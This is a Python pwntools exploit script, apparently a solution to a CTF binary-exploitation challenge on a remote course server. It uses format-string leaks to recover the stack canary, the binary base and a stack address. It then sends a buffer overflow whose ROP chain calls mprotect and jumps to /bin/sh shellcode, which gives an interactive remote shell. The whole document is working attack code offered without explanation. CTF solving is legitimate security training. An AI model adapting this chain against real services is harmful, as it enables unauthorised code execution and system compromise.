from pwn import *

context.arch = "amd64"

#r = process('./ret222')
r = remote('csie.ctf.tw', 10122)

# leak canary
r.recvuntil('> ')
r.sendline('1')
r.recvuntil(':')
r.sendline('%23$p')

r.recvuntil('> ')
r.sendline('2')
canary = int(r.recvuntil('*').split(':')[1].strip('*'),16)
print "canary:",hex(canary)

# leak base address
r.recvuntil('> ')
r.sendline('1')
r.recvuntil(':')
r.sendline('%24$p')

r.recvuntil('> ')
r.sendline('2')
base = int(r.recvuntil('*').split(':')[1].strip('*'),16) - 0xd40
print "base address:",hex(base)

# leak stack address
r.recvuntil('> ')
r.sendline('1')
r.recvuntil(':')
r.sendline('%p')

r.recvuntil('> ')
r.sendline('2')
stack = int(r.recvuntil('*').split(':')[1].strip('*'),16) - 0xac20 + 0xd2b0
print "stack address:",hex(stack)

# ROPGadgets
pop_rbp = base + 0x990
pop_rdi = base + 0xda3
pop_rsi_pop_r15 = base + 0xda1
mprotect = base + 0xd0b
new_rbp = stack + 0xe0
shell_address = stack + 0xf0
shell = asm(pwnlib.shellcraft.amd64.sh())

# buffer overflow
r.recvuntil('> ')
r.sendline('3')
r.recvuntil(':')
payload = "A" * 136 + p64(canary) + "A" * 8 + flat([pop_rbp,new_rbp,pop_rdi,stack & 0xfffffffffffff000,pop_rsi_pop_r15,0x3000,0x0,mprotect,canary,new_rbp,shell_address]) + shell
r.sendline(payload)
print "payload send"

# start jumping
r.recvuntil('> ')
r.sendline('4')

r.interactive()
